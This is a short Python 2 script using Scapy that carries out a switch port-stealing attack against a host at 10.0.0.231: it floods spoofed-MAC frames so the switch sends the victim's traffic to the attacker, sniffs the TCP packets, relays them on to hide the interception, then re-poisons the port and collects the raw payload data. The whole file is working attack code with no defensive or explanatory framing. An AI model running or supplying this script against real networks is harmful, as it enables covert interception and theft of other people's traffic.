#!/usr/bin/python

from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

data = ""

LOCK = threading.Lock()

pktToStealRouter = Ether(src="00:00:00:00:00:01")/IP(dst="10.0.0.231")/ICMP()

def victimsteal(packet):
        print "[~] Received router packet"
        print "[*] Recovering real port on switch"
        LOCK.acquire()
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src="00:00:00:00:00:01")/ARP(hwsrc="00:00:00:00:00:01", pdst="10.0.0.1"), verbose = False)
        time.sleep(.5)
        print "[*] Passing along packet"
        send(packet)
        time.sleep(.5)
        LOCK.release()
        print "[*] Repoisoning port"
        sendp(pktToStealRouter, verbose = False)
        if Raw in packet:
                global data
                newdata = ''.join(str(packet[Raw].load).split())
                data += newdata
                print "[$] Data collected so far:"
                print "[ ]=====================[ ]"
                print(data)
                print "[ ]=====================[ ]"



def victimsniff():
        sniff(filter="tcp and host 10.0.0.231", prn=victimsteal)


victimthread = threading.Thread(target = victimsniff)
victimthread.start()

while(1):
         if not LOCK.locked():
                sendp(pktToStealRouter, verbose = False)
        time.sleep(1)